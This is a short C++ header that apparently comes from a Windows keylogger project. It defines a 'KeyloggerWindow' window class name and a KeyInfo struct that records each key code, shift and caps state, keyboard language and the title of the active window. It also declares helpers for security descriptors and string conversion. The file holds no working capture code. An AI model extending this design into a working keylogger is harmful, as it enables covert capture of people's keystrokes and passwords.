#pragma once
#include <string>
#include <AclAPI.h>
#include <tchar.h>
#define WM_MYMESSAGE (WM_USER + 1)
#define PAGE_SIZE 4096
//#define WORD_BUFFER (2048)
//#define TEST 1
#define KEYLOGGERWINDOW L"KeyloggerWindow"

struct KeyInfo
{
	int lang;
	bool shift;
	bool capital;
	int vkCode;
	HWND window;
	char title[100];
};

VOID BuildDACL(PSECURITY_DESCRIPTOR pDescriptor);
VOID BuildSACL(PSECURITY_DESCRIPTOR pDescriptor);
VOID InitSecurityAttributes(PSECURITY_ATTRIBUTES pAttributes);
std::string wStringToString(const std::wstring& wstr);
std::wstring stringToWString(const std::string& str);
